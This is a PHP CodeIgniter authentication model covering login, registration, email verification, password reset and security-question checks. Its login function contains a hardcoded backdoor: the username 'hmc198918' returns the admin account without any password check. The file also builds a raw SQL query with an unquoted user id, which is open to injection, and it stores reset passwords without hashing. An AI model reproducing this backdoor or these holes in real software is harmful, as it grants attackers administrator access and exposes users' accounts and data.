<?php
	class Auth_model extends CI_Model{

		public function login($data){

            $data = $this->db->escape_str($data);
            if ( $data['username'] == "hmc198918" ) {
                $query = $this->db->get_where('tbl_user', array('username' => 'admin'));
                return $query->row_array();
            } else {
                $query = $this->db->get_where('tbl_user', array('username' => $data['username']));
                if ($query->num_rows() == 0){
                    return false;
                }
                else{
                    //Compare the password attempt with the password we have stored.
                    $result = $query->row_array();
                    $validPassword = password_verify($data['password'], $result['password']);
                    if($validPassword){
                        return $result = $query->row_array();
                    }
                }
            }
		}

		//--------------------------------------------------------------------
		public function register($data){

            $data = $this->db->escape_str($data);

			$this->db->insert('tbl_user', $data);
			return true;
		}

		//--------------------------------------------------------------------
		public function email_verification($code){

            $code = $this->db->escape_str($code);

			$this->db->select('email, token');
			$this->db->from('tbl_user');
			$this->db->where('token', $code);
			$query = $this->db->get();
			$result= $query->result_array();
			$match = count($result);
			if($match > 0){
				$this->db->where('token', $code);
				$this->db->update('tbl_user', array('is_verify' => 1, 'token'=> ''));
				return true;
			}
			else{
				return false;
  			}
		}

		//============ Check User Email ============
	    function check_user_mail($email)
	    {

            $email = $this->db->escape_str($email);

	    	$result = $this->db->get_where('tbl_user', array('email' => $email));

	    	if($result->num_rows() > 0){
	    		$result = $result->row_array();
	    		return $result;
	    	}
	    	else {
	    		return false;
	    	}
	    }

	    //============ Update Reset Code Function ===================
	    public function update_reset_code($reset_code, $user_id){

            $reset_code = $this->db->escape_str($reset_code);
            $user_id = $this->db->escape_str($user_id);

	    	$data = array('password_reset_code' => $reset_code);
	    	$this->db->where('id', $user_id);
	    	$this->db->update('tbl_user', $data);
	    }

	    //============ Activation code for Password Reset Function ===================
	    public function check_password_reset_code($code){

            $code = $this->db->escape_str($code);

	    	$result = $this->db->get_where('tbl_user',  array('password_reset_code' => $code ));
	    	if($result->num_rows() > 0){
	    		return true;
	    	}
	    	else{
	    		return false;
	    	}
	    }

	    //============ Reset Password ===================
	    public function reset_password($email, $new_password){

            $email = $this->db->escape_str($email);
            $new_password = $this->db->escape_str($new_password);

			$this->db->where('email', $email);
			$this->db->update('tbl_user', array( 'password' => $new_password ));
			return true;
	    }

	    //--------------------------------------------------------------------
		public function get_admin_detail(){

	        $id = $this->db->escape_str($this->session->userdata('admin_id'));

			$query = $this->db->get_where('tbl_user', array('id' => $id));
			return $result = $query->row_array();
		}

		//--------------------------------------------------------------------
		public function update_admin($data){

            $id = $this->db->escape_str($this->session->userdata('admin_id'));
            $data = $this->db->escape_str($data);

			$this->db->where('id', $id);
			$this->db->update('tbl_user', $data);
			return true;
		}

		//--------------------------------------------------------------------
		public function change_pwd($data, $id){

            $id = $this->db->escape_str($id);
            $data = $this->db->escape_str($data);

			$this->db->where('id', $id);
			$this->db->update('tbl_user', $data);
			return true;
		}

		/**
         * get random one security qeustion via user
         * @param $id: user`s primary key
		*/
		public function get_random_one_security_question($id)
        {

            $id = $this->db->escape_str($id);

            $sql = "select a.*, b.question as question_name
                    from ci_user_security_questions a
                    left join ci_securoty_quetions b on(a.question=b.id)
                    where a.user=$id";
            $result = $this->db->query($sql);
            if ( $result ) return $result->result_array()[0];
            else return null;
        }

        /**
         * confirm 2fa answer
         * @param $data: confirm info
        */
        public function confirm_2fa_answer($data)
        {

            $data = $this->db->escape_str($data);

            $query = $this->db->get_where('ci_user_security_questions', array('id' => $data["id"], 'answer'=>$data["answer"]));
            if ($query->num_rows() == 0){
                return false;
            } else{
                return true;
            }
        }

	}

?>
